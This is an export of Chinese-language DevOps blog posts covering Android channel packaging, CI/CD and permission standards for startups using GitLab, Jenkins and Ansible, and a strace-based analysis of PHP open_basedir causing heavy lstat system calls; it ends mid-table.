<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>任何自动化的前提必须先规范化,针对Android多渠道打包渠道命名，apk包命名需要先统一，apk包不要多环境混用(生产环境和测试环境要分离,测试包可自定义切换)；到了这里，会发现我TM乱七八糟搞了这一陀哪里酸爽了？另外一个思路是通过修改apk文件的注释,程序在启动时读取apk文件注释获取渠道名(但是Android系统直到API 19，也就是4.4以上的版本才支持data/app/<package>.apk)<br><strong><em>爽在哪里？</em></strong><br> 1. 打包不再需要开发本地执行(避免中断开发,多人协作时优势更为明显)<br> 2. 多渠道打包时间在于第一个包编译生成和签名的时间,之后的无论多少渠道都只是修改包的META-INF/channel_wandoujia空文件名实现<br> 3. 点下Jenkins按钮无需在等待打包过程，打包完成后发送消息到钉钉会话，这下爽了吗？</package></p>
<h4 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h4><blockquote>
<p>Gradle入门  <a href="http://www.androidchina.net/2155.html" target="_blank" rel="external">http://www.androidchina.net/2155.html</a><br>Android签名 <a href="http://www.tuicool.com/articles/2eMZJfu" target="_blank" rel="external">http://www.tuicool.com/articles/2eMZJfu</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> CI/CD </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[初创公司应该如何做好持续集成和部署？]]></title>
      <url>/2016/03/16/startup-company-cicd.html</url>
      <content type="html"><![CDATA[<p>　　　 持续集成和部署是每一个互联网团队都必须要面对的问题，特别是初创公司业务和技术团队快速增长，技术积累较弱的情况下，一个高效的，可遵循持续的运维规范尤为重要，最近一段时间一直在梳理项目开发流程以及自动化测试和部署规范，作为一个总结和大家分享，希望有所帮助：<br>高效可持续的运维环境需要合理的规范作为支撑:</p>
<blockquote>
<ul>
<li>应用管理规范</li>
<li>权限管理规范</li>
<li>配置变更规范</li>
<li>发布策略规范</li>
<li>日志运维规范</li>
<li>持续集成部署实战</li>
</ul>
</blockquote>
<h3 id="应用管理规范"><a href="#应用管理规范" class="headerlink" title="应用管理规范"></a>应用管理规范</h3><h4 id="应用版本化"><a href="#应用版本化" class="headerlink" title="应用版本化"></a>应用版本化</h4><p>　　　 可以使用SVN,Git对代码进行版本控制，建议使用Git(GitLab)<br>　　　 项目Group命名规范: 按大的原则根据产品域名区分  或者根据前后端业务模块进行分组(小写字母命名,横杠[-]作为连接字符)<br>　　　 比如: MAKA官网<a href="http://www.maka.im对应的Git仓库Group为official" target="_blank" rel="external">http://www.maka.im对应的Git仓库Group为official</a><br>　　　 按照功能模块分组如商城前端对应的Git仓库Group为store<br>项目名命名规范: 小写字母命名,横杠[-]作为连接字符,命名规则[产品名称]-[项目类型]-(自定义名称),如official-store<br><strong>注:</strong> 在创建项目仓库时就要权衡前后端或者大的功能模块的拆分保持低耦合度</p>
<h4 id="合理的分支策略"><a href="#合理的分支策略" class="headerlink" title="合理的分支策略"></a>合理的分支策略</h4><p>常用的Git工作流：</p>
<p><strong>集中式工作流</strong>：很多公司使用SVN,Git使用并不熟悉,如果迁移至Git之后可以考虑集中式工作流进行开发，代码库只有master一个分支,所有开发者只有本地master和远端master分支，集中式工作流使用起来虽然简单，但无法充分利用git的优势<br><strong>功能分支工作流</strong>： 与集中式工作流不同的地方在于除了master分支以外有功能分支(按功能需求创建的功能分支如third-party-login-feature)，日常开发在功能分支,提测集成时提交Merge Requests(在Bitbucket中是Pull Request)，此处开发者可以进行讨论审核代码,同意后可以合并至master分支,未同意或者让开发者修改后重新提交可以选择关闭该MR</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/03/featurebranch.png" alt=""><br><strong>Gitflow工作流</strong>：两个主干分支master(正式发布的历史)和develop(功能集成分支)，开发者应基于develop分支创建feature功能分支用于开发,开发完成后提交merge requests请求合并进develop分支,此时若到了发布窗口,基于此时的develop分支创建发布分支release用于测试,预发布,发布以避免影响develop分支的正常集成合并功能分支；release分支不再有新的功能合并进来，一旦创建只用于bug修复并将修复cherry-pick到develop分支;发布完成后，release分支合并进master并分配版本号打tag用于存放发布历史;Gitflow工作流方式适用于大型项目<br><strong>Forking工作流</strong>：开发者fork官方的repo到自己的账号空间,对于官方分支只有只读权限，开发者通过pr提交给官方审核是否合并进代码库;开发者通过同步上游官方的repo来使用其他人的代码,分支策略可参考上述三种工作流,适合开源项目</p>
<p>　　　 针对创业公司参与同一个项目的开发者并不多,过于复杂的分支策略并不能带来便利;可以参考leancloud的分支模式,根据团队的使用情况进行调整</p>
<p><strong>介绍下我们当前使用的分支策略：</strong><br>　　　 master：主干分支master用于日常开发的基线<br>　　　 userA：   开发者A日常开发所在分支<br>　　　 release-201603091106: master分支集成测试完成后,构建到预发布环境时自动创建release-201603091106用于发布<br>　　　 hotfix-201603091106 基于当前发布之后的release-201603091106分支用于修复bug,在通过提交merge requests方式合并进release-201603091106，并将修复cherry-pick到master分支<br>　　　 日常开发在userA分支操作，然后提交merge requests请求合并至master分支,本地通过git fetch origin master，然后在userA分支git rebase origin/master将master最新commit合并到本地userA分支从而形成闭环开发</p>
<h4 id="关于代码审核"><a href="#关于代码审核" class="headerlink" title="关于代码审核"></a>关于代码审核</h4><p>　　　三剑客GitLab+Jenkins+Gerrit,Gerrit作为创业公司代码审核的话略显复杂，不足够敏捷;建议使用GitLab的Merge Requests或者Github和Bitbucket中Pull Requests作为代码审核和讨论的工具,也可以选择Facebook的Phabricator(可同时作为代码托管和评审,非常敏捷,由于Phabricator提供的工具集在windows下使用起来不太友好,后来没有选用,后期会分享Phabricator的使用思路和工作流)</p>
<h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p>　　　规范的目录结构不仅有利于开发者理解代码结构,更有利于代码的快速部署，以PHP为例目录结构建议将代码配置文件(数据库，Redis，OSS Key，语言开关，日志级别开关等),日志文件,其他文件缓存等独立于代码库之外存放，前端项目src为源码目录,dist为前端经过压缩合并等最终生成的代码目录(发布时可忽略src);<br>　　　每个项目详细写README.md:项目说明,各个环境对应的访问路径,目录说明,构建压缩方式,Nginx配置等,代码仓库中包含额外的test目录存放测试用例(本着谁开发谁写测试用例);</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/03/tree.png" alt=""></p>
<h3 id="权限管理规范"><a href="#权限管理规范" class="headerlink" title="权限管理规范"></a>权限管理规范</h3><p>　　　权限有两类一个是系统权限(包括服务器登陆，数据库/Redis等)另外一个是服务运行时的权限;</p>
<h4 id="针对系统权限层面"><a href="#针对系统权限层面" class="headerlink" title="针对系统权限层面"></a>针对系统权限层面</h4><p>　　　统一入口，受限访问IP，禁止空密码弱口令，生产环境服务器需要先拨入vpn之后通过跳板机才能连接成功（当然我们使用的是开源当中最好的跳板机Jumpserver），任何人的操作都需要审计;生产数据库及Redis禁止了外网访问,分别使用phpMyAdmin和RedisLive统一访问入口(增加了多主机访问及屏蔽了危险操作如DDL 数据的导入导出等，也需要先拨入vpn才能访问);</p>
<p>　　　开发测试环境权限控制现对宽松,DEV Leader和QA Leader同时具有开发和测试环境的服务器及数据库权限，便于测试和Debug;生产环境为了便于开发调试生产代码且不影响线上增加了低配的节点，未在线，但环境，代码及后端均和生产一致;</p>
<h4 id="针对服务权限层面"><a href="#针对服务权限层面" class="headerlink" title="针对服务权限层面"></a>针对服务权限层面</h4><p>　　　以web服务为例:Nginx和php-fpm运行用户和用户组为www-data,代码目录用户为www,这样代码目录默认情况下web服务只读,避免出现文件和目录777权限的情况；日志和缓存目录用户设置www-data，但要禁止访问php等动态文件</p>
<p>　　　禁止危险函数phpinfo exec eval system等,具体可参考<a href="http://www.sinacloud.com/doc/sae/php/runtime.html,禁止夸目录访问open_basedir，是否开启的性能对比请参考http://blog.simlinux.com/archives/1531.html" target="_blank" rel="external">http://www.sinacloud.com/doc/sae/php/runtime.html,禁止夸目录访问open_basedir，是否开启的性能对比请参考http://blog.simlinux.com/archives/1531.html</a></p>
<h3 id="配置变更规范"><a href="#配置变更规范" class="headerlink" title="配置变更规范"></a>配置变更规范</h3><h4 id="系统部署"><a href="#系统部署" class="headerlink" title="系统部署"></a>系统部署</h4><p>　　　传统IDC机房可以通过定制镜像或者使用cobbler定制安装，运行的服务也可以定制在镜像中,但建议安装系统时注册puppet/salt agent，再自动化署相关服务<br>　　　公有云中可以在服务器上部署相应环境后创建系统快照制作系统镜像,弹性扩容时可选择该镜像自动化安装   </p>
<h4 id="日常变更"><a href="#日常变更" class="headerlink" title="日常变更"></a>日常变更</h4><p>　　   日常变更包括服务配置的变更和代码配置的变更,这些操作我们是通过Ansible(对比puppet/salt的好处就是简单方便不用装agent，后面会详细介绍如何基于Ansible做发布回滚)，变更内容使用git进行版本控制制</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/03/ansible-dire.png" alt=""></p>
<h3 id="发布策略规范"><a href="#发布策略规范" class="headerlink" title="发布策略规范"></a>发布策略规范</h3><h4 id="发布时间"><a href="#发布时间" class="headerlink" title="发布时间"></a>发布时间</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2016/03/deploytime.jpg" alt=""></p>
<p><strong>注意:</strong>以上请根据自己业务做相应调整,避免在业务高峰期发布(除应急bug外),我们业务高峰期基本在18:00-23:30，低峰期基本在01:00-06:00,这也是微信分享阅读的高峰和低峰时段;无论应急Bug还是日常迭代都必须由QA测试通过和产品经理审核通过后才能上线(曾经出现过开发为了修复线上很急的bug,开发修复后自主上线导致生产出现更严重的问题)</p>
<h4 id="发布工具的选择"><a href="#发布工具的选择" class="headerlink" title="发布工具的选择"></a>发布工具的选择</h4><p>　　　 无论是自主开发发布系统亦或是使用开源的系统都要本着解决问题的原则,否则只能是重复造轮子,然并卵呀<br>　　　 开源的持续集成和发布里面个人觉得比较好的如:Jenkins,Walle,Spinnaker，go，Gitlab-ci，Bamboo(收费)等，其他参考<a href="https://github.com/geekwolf/sa-scripts/blob/master/devops.md" target="_blank" rel="external">https://github.com/geekwolf/sa-scripts/blob/master/devops.md</a><br>　　　 下面介绍我们基于GitLab+Jenkins+Ansible(Flamingo自动化代码发布工具)实现的自动化代码部署平台，流程如下:</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/03/cicdflow.png" alt=""></p>
<p>　　　<strong>Flamingo</strong>(“火烈鸟”,<a href="https://github.com/geekwolf/flamingo)是基于Ansible的自动化代码发布工具，目的是实现统一的代码发布方式,思路基于Capistrano,并对Ansisrano进行了改造可以通过传入语言环境,主机组(应用组/灰度机组等),项目代码库,分支名称,项目名称等参数来进行自动化打包发布,也可以将Flamingo工具二次打包使用" target="_blank" rel="external">https://github.com/geekwolf/flamingo)是基于Ansible的自动化代码发布工具，目的是实现统一的代码发布方式,思路基于Capistrano,并对Ansisrano进行了改造可以通过传入语言环境,主机组(应用组/灰度机组等),项目代码库,分支名称,项目名称等参数来进行自动化打包发布,也可以将Flamingo工具二次打包使用</a><br>　　　<strong>Flamingo</strong>本者回滚即发布的原则以简化发布流程，回滚时传入要回滚的分支即可，其他参数可参看defaults/main.yml进行了解;(注:依赖Git/rsync/ansible)<br>　　　 例子:</p>
<pre><code>ansible-playbook deploy.yml  --extra-vars=&apos;flamingo_git_repo=git@github.com:geekwolf/flamingo.git flamingo_product_name=flamingo&apos;
</code></pre><p>　　　 执行后生成的目录结构如下图(目录定义请参考defaults/main.yml):</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/03/deploymentdire.jpg" alt=""></p>
<h3 id="日志运维规范"><a href="#日志运维规范" class="headerlink" title="日志运维规范"></a>日志运维规范</h3><p>　　　 毫无疑问规范的日志对于运维和开发排查问题有非常大的帮助，例如PHP项目日志格式可以规范为时间,日志级别,日志内容(比如对于连接多个DB时出现连接不上或超时应该把实例地址一同写入日志)，可以参考psr-3的标准: <a href="http://www.php-config.org/psr/psr-3" target="_blank" rel="external">http://www.php-config.org/psr/psr-3</a><br>　　　 通过ELK将业务日志,PHP自身错误日志/慢日志,Nginx慢日志等进行搜集统计并结合Zabbix实现报警,便于及早发现问题</p>
<h3 id="持续集成部署实战"><a href="#持续集成部署实战" class="headerlink" title="持续集成部署实战"></a>持续集成部署实战</h3><p>　　　 后续篇章会分享针对PHP/JAVA/前端以及Android/ios持续集成和部署实战,敬请关注</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>　　　 以上只是粗略对持续集成和部署过程中遇到的问题进行了总结，可能并不完美，但对于初创公司应该有些帮助,欢迎一起学习讨论！</p>
]]></content>
      
        <categories>
            
            <category> CI/CD </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DevOps </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ 记一次Web服务器lstat系统调用严重故障分析]]></title>
      <url>/2015/12/14/php-openbasedir.html</url>
      <content type="html"><![CDATA[<h4 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Centos6.5 x64</div><div class="line">Tengine-2.1.0</div><div class="line">PHP-5.5.30</div></pre></td></tr></table></figure>
<p>随着业务流量增加,根据监控发现系统%sys的CPU占用率一度超过40%~50%(业务高峰期更为严重),<br>由于系统跑的是PHP,Nginx服务没有其它额外服务,PHP又容易成为系统的瓶颈，故使用strace跟踪了php-fpm进程的调用,如图:</p>
<h4 id="看现象"><a href="#看现象" class="headerlink" title="看现象"></a>看现象</h4><p>通过top命令查看实时状态,%sys内核态CPU占比非常高,负载较高</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2015/12/te.jpg" alt=""></p>
<p>通过strace跟踪php-fpm进程运行时的系统调用 strace -c -p $(pgrep -n php-fpm)<img src="http://ow1schdt5.bkt.clouddn.com/2015/12/lstat.jpg" alt=""></p>
<p>lstat调用到底干什么的呢？<a href="http://ow1schdt5.bkt.clouddn.com/2015/12/manlstat.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2015/12/manlstat.jpg" alt="manlstat"></a><br><a href="http://ow1schdt5.bkt.clouddn.com/2015/12/manlstat.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2015/12/manlstat-1024x400.jpg" alt="manlstat"></a><a href="http://ow1schdt5.bkt.clouddn.com/2015/12/te.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2015/12/te.jpg" alt="te"></a></p>
<h4 id="分析问题"><a href="#分析问题" class="headerlink" title="分析问题"></a>分析问题</h4><p>根据上面的现象可以看到lstat调用占用绝大部份的内核态CPU时间，可以通过strace跟踪php-fpm详细的lstat调用规律<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">strace  -o strace.out -r -s 256 $(pgrep -n php-fpm)</div><div class="line">    0.000051 getcwd(&quot;/data/wwwroot/run/platv3/public&quot;, 4096) = 43</div><div class="line">     0.000037 lstat(&quot;/data/wwwroot/run/platv3/public/../application/config/production/frontend_config.php&quot;, 0x7fffbe160260) = -1 ENOENT (No such file or directory)</div><div class="line">     0.000055 lstat(&quot;/data/wwwroot/run/platv3/public/../application/config/production&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000058 lstat(&quot;/data/wwwroot/run/platv3/public/../application/config&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000054 lstat(&quot;/data/wwwroot/run/platv3/public/../application&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000052 lstat(&quot;/data/wwwroot/run/platv3/public&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000050 lstat(&quot;/data/wwwroot/run/platv3&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000058 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000046 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000043 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000045 lstat(&quot;/data/wwwroot/run/platv3/application/config/production/frontend_config.php&quot;, 0x7fffbe160270) = -1 ENOENT (No such file or directory)</div><div class="line">     0.000050 readlink(&quot;/data/wwwroot/run/platv3/application/config/production/frontend_config.php&quot;, 0x7fffbe162410, 4095) = -1 ENOENT (No such file or directory)</div><div class="line">     0.000077 lstat(&quot;/data/wwwroot/run/platv3/application/config/production&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000059 lstat(&quot;/data/wwwroot/run/platv3/application/config&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000052 lstat(&quot;/data/wwwroot/run/platv3/application&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000050 lstat(&quot;/data/wwwroot/run/platv3&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000047 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000070 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000046 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000046 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000047 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000044 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000045 access(&quot;../application/config/production/frontend_config.php&quot;, F_OK) = -1 ENOENT (No such file or directory)</div><div class="line">     0.000051 getcwd(&quot;/data/wwwroot/run/platv3/public&quot;, 4096) = 43</div><div class="line">     0.000038 getcwd(&quot;/data/wwwroot/run/platv3/public&quot;, 4096) = 43</div><div class="line">     0.000036 lstat(&quot;/data/wwwroot/run/platv3/public/../application/config/frontend_config.php&quot;, &#123;st_mode=S_IFREG|0775, st_size=1556, ...&#125;) = 0</div><div class="line">     0.000069 lstat(&quot;/data/wwwroot/run/platv3/public/../application/config&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000057 lstat(&quot;/data/wwwroot/run/platv3/public/../application&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000053 lstat(&quot;/data/wwwroot/run/platv3/public&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000052 lstat(&quot;/data/wwwroot/run/platv3&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000049 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000075 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000045 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000046 lstat(&quot;/data/wwwroot/run/platv3/application/config/frontend_config.php&quot;, &#123;stG|0775, st_size=9882, ...&#125;) = 0</div><div class="line">     0.000056 lstat(&quot;/data/wwwroot/run/platv3/application/libraries&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000052 lstat(&quot;/data/wwwroot/run/platv3/application&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000049 lstat(&quot;/data/wwwroot/run/platv3&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000048 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000045 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000043 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000046 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000046 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000043 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000111 access(&quot;../application/libraries/X_Session.php&quot;, F_OK) = 0</div><div class="line">     0.000071 getcwd(&quot;/data/wwwroot/run/platv3/public&quot;, 4096) = 43</div><div class="line">     0.000043 lstat(&quot;/data/wwwroot/run/platv3/system/libraries/Session.php&quot;, &#123;st_mode=S_IFREG|0775, st_size=19266, ...&#125;) = 0</div><div class="line">     0.000060 lstat(&quot;/data/wwwroot/run/platv3/system/libraries&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000051 lstat(&quot;/data/wwwroot/run/platv3/system&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000050 lstat(&quot;/data/wwwroot/run/platv3&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000049 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000055 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000045 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000045 lstat(&quot;/data/wwwroot/run/platv3/system/libraries/Session.php&quot;, &#123;st_mode=S_IFREG|0775, st_size=19266, ...&#125;) = 0</div><div class="line">     0.000055 lstat(&quot;/data/wwwroot/run/platv3/system/libraries&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000053 lstat(&quot;/data/wwwroot/run/platv3/system&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000052 lstat(&quot;/data/wwwroot/run/platv3&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000053 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000047 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000051 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000047 lstat(&quot;/data/wwwroot/run/platv3/public&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000058 lstat(&quot;/data/wwwroot/run/platv3&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000114 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000048 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000043 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000046 lstat(&quot;/data/wwwroot/run/platv3/system/libraries/Session.php&quot;, &#123;st_mode=S_IFREG|0775, st_size=19266, ...&#125;) = 0</div><div class="line">     0.000055 lstat(&quot;/data/wwwroot/run/platv3/system/libraries&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000052 lstat(&quot;/data/wwwroot/run/platv3/system&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000050 lstat(&quot;/data/wwwroot/run/platv3&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000061 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000051 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000044 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000045 lstat(&quot;/data/wwwroot/run/platv3/system/libraries/Session.php&quot;, &#123;st_mode=S_IFREG|0775, st_size=19266, ...&#125;) = 0</div><div class="line">     0.000055 lstat(&quot;/data/wwwroot/run/platv3/system/libraries&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000053 lstat(&quot;/data/wwwroot/run/platv3/system&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000049 lstat(&quot;/data/wwwroot/run/platv3&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000050 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000046 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000045 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000045 lstat(&quot;/data/wwwroot/run&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000120 lstat(&quot;/data/wwwroot&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div><div class="line">     0.000055 lstat(&quot;/data&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</div></pre></td></tr></table></figure></p>
<p>由上面的信息不难看到程序在使用include,require,require_once,include_once,fopen,gzopen等开启了open_basedir之后,lstat调用会递归访问的文件目录查看文件位置限制，文件在open_basedir指定的目录以外时将拒绝打开,所有符号链接也会被解析无法避免此限制 ,这样就导致了lstat()调用比不开启open_basedir调用频率高很多;另外include,require,require_once,include_once在包含相对路径时,如果代码中存在大量的这样的语句,每次都从include_path中查找相应的文件,也会造成性能问题,所以通常用 realpath_cache_size 和realpath_cache_ttl来对文件的realpath进行缓存,但是开启了open_basedir之后,这个缓存是失效的;查看了官方的bug：<a href="https://bugs.php.net/bug.php?id=52312" target="_blank" rel="external">https://bugs.php.net/bug.php?id=52312</a> 有记录并没有修复,估计是考虑到安全问题</p>
<h4 id="验证问题"><a href="#验证问题" class="headerlink" title="验证问题"></a>验证问题</h4><p>大概了解了问题原因之后,对症下药来做测试,按三种情况测试下性能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div 